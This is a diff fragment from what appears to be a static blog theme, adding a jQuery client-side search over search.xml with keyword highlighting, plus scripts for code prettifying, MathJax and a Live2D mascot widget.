+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":250,"height":500,"position":"left","hOffset":0,"vOffset":-100},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
